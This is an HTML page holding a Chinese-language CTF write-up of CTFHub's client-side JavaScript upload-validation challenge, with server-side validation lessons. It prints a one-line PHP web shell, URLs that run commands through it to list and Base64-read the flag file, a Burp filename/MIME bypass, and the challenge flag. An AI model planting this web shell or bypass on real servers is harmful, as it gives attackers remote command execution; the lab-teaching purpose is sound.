@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Writeup: CTFHub 文件上传 - js前端验证 - Y11516</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=Orbitron:wght@700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0a0e17; background-image: radial-gradient(circle at 50% 20%, rgba(0, 240, 255, 0.05) 0%, transparent 50%); font-family: 'Inter', sans-serif; color: #ccd6f6; padding: 6rem 1rem 4rem 1rem; display: flex; justify-content: center; line-height: 1.8; }
+        .navbar { position: fixed; top: 0; left: 0; width: 100%; padding: 1.2rem 5%; display: flex; justify-content: space-between; align-items: center; background: rgba(10, 14, 23, 0.7); backdrop-filter: blur(12px); border-bottom: 1px solid rgba(0, 240, 255, 0.15); z-index: 999; }
+        .logo { font-family: 'Orbitron', sans-serif; font-weight: 900; font-size: 1.2rem; color: #00f0ff; letter-spacing: 2px; }
+        .nav-links a { color: #8892b0; text-decoration: none; margin-left: 2rem; font-size: 0.9rem; transition: 0.3s; }
+        .nav-links a:hover { color: #00f0ff; }
+        .post-container { max-width: 820px; width: 100%; background: rgba(255,255,255,0.03); backdrop-filter: blur(6px); border: 1px solid rgba(255,255,255,0.06); border-radius: 32px; padding: 3rem; box-shadow: 0 30px 80px rgba(0, 0, 0, 0.6); }
+        h1 { font-family: 'Orbitron', sans-serif; font-size: 2.2rem; margin-bottom: 0.5rem; color: #00f0ff; text-shadow: 0 0 15px rgba(0, 240, 255, 0.3); }
+        .date { color: #475569; font-size: 0.9rem; margin-bottom: 2rem; padding-bottom: 1rem; border-bottom: 1px solid rgba(0, 240, 255, 0.2); display: flex; gap: 15px; flex-wrap: wrap;}
+        .date span { background: rgba(0, 240, 255, 0.1); padding: 0.2rem 0.8rem; border-radius: 12px; color: #00f0ff; font-size: 0.8rem; }
+        h2 { color: #a855f7; font-size: 1.4rem; margin: 2.5rem 0 1rem 0; border-left: 4px solid #a855f7; padding-left: 10px; }
+        h3 { color: #e2e8f0; font-size: 1.15rem; margin: 1.8rem 0 0.8rem 0; }
+        h4 { color: #c084fc; font-size: 1rem; margin: 1.2rem 0 0.6rem 0; }
+        p { margin-bottom: 1rem; color: #94a3b8; }
+        strong { color: #e2e8f0; }
+        code { background: rgba(0, 240, 255, 0.1); padding: 0.2rem 0.4rem; border-radius: 4px; font-family: 'Courier New', monospace; color: #00f0ff; font-size: 0.95rem; }
+        pre { background: #0f172a; padding: 1rem; border-radius: 8px; overflow-x: auto; border: 1px solid #1e293b; margin-bottom: 1rem; }
+        pre code { background: transparent; padding: 0; color: #e2e8f0; }
+        ul, ol { padding-left: 1.5rem; margin-bottom: 1rem; color: #94a3b8; }
+        li { margin-bottom: 0.5rem; }
+        .highlight-box { background: rgba(168, 85, 247, 0.05); border: 1px solid rgba(168, 85, 247, 0.2); border-radius: 12px; padding: 1.5rem; margin-bottom: 1rem; }
+        .note-box { background: rgba(0, 240, 255, 0.05); border-left: 3px solid #00f0ff; padding: 1rem; margin-bottom: 1rem; border-radius: 0 8px 8px 0; }
+        .action-bar { display: flex; justify-content: center; gap: 1.5rem; margin-top: 3rem; flex-wrap: wrap; }
+        .action-link { color: #00f0ff; text-decoration: none; border: 1px solid #00f0ff; padding: 10px 24px; border-radius: 30px; transition: 0.3s; }
+        .action-link:hover { background: rgba(0, 240, 255, 0.1); }
+        .action-link.secondary { color: #8892b0; border-color: #475569; }
+        @media (max-width: 640px) { .post-container { padding: 1.5rem; } h1 { font-size: 1.5rem; } .action-bar { flex-direction: column; } }
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <div class="logo"><i class="fas fa-shield-halved"></i> Y11516</div>
+        <div class="nav-links">
+            <a href="/ctf.html"><i class="fas fa-bug"></i> CTF 总库</a>
+            <a href="/"><i class="fas fa-house"></i> 主页</a>
+        </div>
+    </nav>
+
+    <div class="post-container">
+        <h1><i class="fas fa-code"></i> CTFHub 文件上传 - js前端验证</h1>
+        <div class="date">
+            <span><i class="far fa-calendar-alt"></i> 2026年9月21日</span>
+            <span><i class="fas fa-tag"></i> CTFHub</span>
+            <span><i class="fas fa-tag"></i> Web安全</span>
+            <span><i class="fas fa-tag"></i> 文件上传</span>
+            <span><i class="fas fa-tag"></i> 前端绕过</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>文件上传 - js前端验证</li>
+            <li><strong>题目平台：</strong>CTFHub 技能树</li>
+            <li><strong>题目类型：</strong>Web安全 / 文件上传漏洞 / 客户端验证绕过</li>
+            <li><strong>靶场链接：</strong>http://challenge-96ff915f278fdb68.sandbox.ctfhub.com:10800（动态环境）</li>
+            <li><strong>涉及工具：</strong>Chrome浏览器、开发者工具（F12）、Base64在线解码工具</li>
+        </ul>
+
+        <h2>二、解题步骤</h2>
+        
+        <h3>1. 分析题目考什么</h3>
+        <p>本题的核心考点是<strong>客户端（前端）JavaScript 验证的不可信性</strong>。题目在“无限制”的基础上增加了前端 JS 校验，试图限制用户只能上传图片。但攻击者可以完全控制自己的浏览器，或者通过抓包修改 HTTP 请求，从而轻易绕过前端验证。后端如果没有二次校验，依然存在 RCE（远程代码执行）漏洞。</p>
+
+        <h3>2. 怎么想（破题思路）</h3>
+        <ul>
+            <li>尝试上传包含 PHP 代码的 <code>shell.php</code> 文件，发现被浏览器弹窗拦截，提示只允许上传图片格式。</li>
+            <li>明确这是前端 JS 验证。由于 JS 代码运行在本地浏览器，攻击者拥有绝对控制权，因此这种验证形同虚设。</li>
+            <li>思路：使用浏览器的开发者工具禁用 JavaScript，直接切断前端校验逻辑。</li>
+            <li>上传成功后，由于后端没有校验，恶意文件依然会被保存，从而获得 WebShell。</li>
+        </ul>
+
+        <h3>3. 怎么解（详细步骤与踩坑记录）</h3>
+        
+        <div class="note-box">
+            <h4><i class="fas fa-exclamation-triangle"></i> 踩坑记录一：误以为需要在 Chrome 全局设置中关闭 JS</h4>
+            <p><strong>踩坑情况：</strong>在浏览器设置（Settings）的“隐私与安全”中寻找关闭 JavaScript 的选项，发现只能调整 V8 引擎的“优化”行为，无法直接禁用 JS。</p>
+            <p><strong>原因分析：</strong>Chrome 全局禁用 JS 的入口很深，且会影响所有网页，不适合当前调试场景。</p>
+            <p><strong>改进方式：</strong>直接在当前靶机页面按 <code>F12</code> 打开开发者工具。点击右上角齿轮（Settings），在左侧选择 <code>Preferences</code>，向下滚动找到 <code>Debugger</code> 选项卡，勾选 <code>Disable JavaScript</code>。这样可以仅针对当前标签页禁用 JS，刷新页面后前端验证代码就不会执行了。</p>
+        </div>
+
+        <div class="highlight-box">
+            <h4><i class="fas fa-terminal"></i> 详细实操步骤</h4>
+            <p><strong>第一步：构造木马文件</strong></p>
+            <p>在本地新建 <code>shell.php</code>，写入以下代码：</p>
+            <pre><code>&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+            <p><strong>代码逐字深度解析：</strong></p>
+            <ul>
+                <li><code>&lt;?php</code>：PHP 脚本的起始标记，告诉 Web 服务器从这里开始按 PHP 代码解析。</li>
+                <li><code>system</code>：PHP 的内置函数，用于执行外部系统命令，并直接输出执行结果。</li>
+                <li><code>( )</code>：函数参数括号，里面的内容会作为命令传给 system 执行。</li>
+                <li><code>$_GET</code>：PHP 超全局变量，用于接收 HTTP GET 请求中 URL 参数的数据。</li>
+                <li><code>[ 'cmd' ]</code>：数组下标。表示提取 URL 中名为 <code>cmd</code> 的参数值。例如 URL 为 <code>?cmd=ls</code>，则 <code>$_GET['cmd']</code> 的值就是 <code>ls</code>。</li>
+                <li><code>;</code>：PHP 语句结束符。</li>
+                <li><code>?&gt;</code>：PHP 脚本的结束标记。</li>
+            </ul>
+
+            <p><strong>第二步：禁用前端 JS 并上传</strong></p>
+            <p>按上述方法在 F12 中勾选 <code>Disable JavaScript</code>。不要关闭开发者工具，选择 <code>shell.php</code> 并点击 <code>Submit</code>。此时无弹窗，页面返回：<code>上传文件相对路径：upload/shell.php</code>（注意是单数 upload）。</p>
+
+            <p><strong>第三步：寻找 Flag 文件</strong></p>
+            <p>在浏览器访问：<code>http://.../upload/shell.php?cmd=ls ../</code></p>
+            <p>页面回显发现可疑文件：<code>flag_1533718635.php</code>。</p>
+
+            <p><strong>第四步：Base64 读取并解码</strong></p>
+            <p>直接访问 <code>.../upload/shell.php?cmd=cat ../flag_1533718635.php</code> 会返回空白页。原因分析：Flag 文件的内容是 <code>&lt;?php // ctfhub{xxxx} ?&gt;</code>，PHP 解析器会执行 <code>&lt;?php</code> 和 <code>?&gt;</code> 之间的代码，<code>//</code> 后面的内容被当作注释，不会输出到浏览器。</p>
+            <p>因此改用 Base64 命令读取：</p>
+            <pre><code>http://.../upload/shell.php?cmd=base64 ../flag_1533718635.php</code></pre>
+            <p>页面回显 Base64 字符串（如 <code>PD9waHAgLy8gY3RmaHVi...</code>）。复制该字符串，在在线 Base64 解码网站解码，得到 Flag：<code>ctfhub{657ba8105753d69748a373df}</code>。</p>
+        </div>
+
+        <h3>4. 怎么迁移（跨领域联想）</h3>
+        <ul>
+            <li><strong>渗透测试实战：</strong>在真实渗透中，遇到前端限制（如长度限制、格式限制），攻击者往往通过 Burp Suite 开启抓包拦截。在请求包发往服务器之前，将文件名从 <code>shell.php.jpg</code> 修改为 <code>shell.php</code>，或者修改 MIME 类型等，完成绕过。</li>
+            <li><strong>安全开发（SDL）：</strong>开发者必须明确“任何来自客户端的数据都是不可信的”。所有验证逻辑必须在服务端（如 PHP 的 <code>move_uploaded_file</code> 之前）进行二次验证，绝不能依赖前端的 JS 验证。</li>
+            <li><strong>逆向工程与调试：</strong>利用 F12 修改网页元素（如双击修改 DOM 属性）、禁用 JavaScript、修改断点，是前端调试和逆向分析的基础技能。这些技能在爬虫对抗、JS 逆向上也有广泛应用。</li>
+        </ul>
+
+        <h2>三、名词大全与原理深度复盘</h2>
+        
+        <div class="highlight-box">
+            <h4>1. 客户端（前端）验证 vs 服务端（后端）验证</h4>
+            <p>客户端验证是运行在用户浏览器中的 JavaScript 代码，它的优势是响应快，能减轻服务器压力；缺点是代码完全暴露且可被用户轻易篡改。服务端验证是运行在 Web 服务器上的代码，用户无法直接修改，是安全验证的唯一屏障。B/S 架构中，安全边界应当划在服务端。</p>
+
+            <h4>2. Base64 编码的本质</h4>
+            <p>Base64 是一种基于 64 个可打印字符来表示二进制数据的编码方式。它常用于在 HTTP 环境下传输二进制数据（如邮件附件、图片）。在本题中，<code>base64</code> 命令将包含 PHP 标签的文件转化为无意义的文本，阻止了 Web 服务器的 PHP 解析器去处理它。这也是 CTF 中绕过 PHP 代码解析输出数据的常用技巧。</p>
+
+            <h4>3. 漏洞成因底层逻辑复盘</h4>
+            <p>造成本题漏洞的根本原因，是开发者对“边界”的认知错误。开发者认为加上了前端 JS 检查，文件就无法被篡改，从而在后端省略了校验逻辑。但在 HTTP 协议中，客户端和服务器之间的数据包是可以被代理拦截和任意修改的。攻击者只需要绕过前端防线，就可以向服务器发送任何恶意数据。</p>
+        </div>
+
+        <h2>四、题目思考</h2>
+        
+        <h3>1. 这跟前面的题有什么区别？</h3>
+        <ul>
+            <li><strong>与“无限制”的区别：</strong>“无限制”是彻底不设防；“js前端验证”则是在第一道门（浏览器）设置了障碍，但通过禁用 JS 或抓包可以轻松突破。</li>
+            <li><strong>与“MIME绕过”、“黑名单绕过”的区别：</strong>前端验证属于在用户侧拦截，绕过难度极低；而 MIME 和黑名单是服务端拦截，属于真正的服务端防御，通常需要构造特定的请求包或者寻找解析漏洞来绕过。</li>
+            <li><strong>与“文件包含漏洞”的区别：</strong>文件包含是服务器提供了一个“执行器”，去执行已有的恶意文件；文件上传是直接把恶意文件送进服务器。两者常组合使用，例如上传图片马，再通过文件包含漏洞去执行。</li>
+        </ul>
+
+        <h3>2. 这种题目的出现原因</h3>
+        <p>这种漏洞在早期 Web 开发中非常普遍。开发人员为了提升用户体验，避免上传无意义的文件导致服务器报错，通常会先在前端用 JS 写一段验证代码。如果后端没有做好二次检查（或者后端只检查了 Content-Type，但 Content-Type 也是客户端可控的），这就形成了典型的“客户端不可信”漏洞。</p>
+
+        <h3>3. 这种应用在实际中如何体现？</h3>
+        <p>在真实应用中，如上传头像、上传附件等业务，攻击者常利用此漏洞上传 Webshell。企业需要部署 WAF（Web 应用防火墙）并在服务器端进行强制校验（后缀名白名单、文件头检测、二次渲染、重命名文件、设置文件目录无执行权限）。</p>
+
+        <h3>4. 如何抽象理解概念（大白话理解）</h3>
+        <div class="highlight-box">
+            <p><strong>把网站服务器比作一家酒吧：</strong></p>
+            <ul>
+                <li><strong>前端验证：</strong>是酒吧门口的保安（浏览器）。他看一眼你带的包，如果是刀（恶意文件），就不让你进。但你可以绕开大门，从窗口爬进去（禁用JS绕过），或者把刀藏在衣服里（抓包改包），甚至你把保安打晕（修改前端代码）直接进去。</li>
+                <li><strong>后端验证：</strong>是酒吧吧台里的安检门（服务器）。如果你只在门口（前端）设防，里面根本没安检，一旦你进去了，你带什么武器都没人管。</li>
+                <li><strong>Base64读取：</strong>就像保险柜（PHP文件）里放了一张写着秘密的纸条，你直接看（cat）保险柜的玻璃被特殊涂层挡住了（PHP解析成空白），你干脆把保险柜整个搬回家里（下载原始数据），用家里的工具（Base64解码）打开看。</li>
+            </ul>
+        </div>
+
+        <p style="margin-top: 2rem; text-align: center; color: #475569;"><i class="fas fa-code"></i> 做一道题，就要往自己脑子里装点东西。</p>
+
+        <div class="action-bar">
+            <a href="/ctf.html" class="action-link"><i class="fas fa-arrow-left"></i> 返回 CTF 总库</a>
+            <a href="/" class="action-link secondary"><i class="fas fa-house"></i> 返回主页</a>
+        </div>
+    </div>
+</body>
+</html>
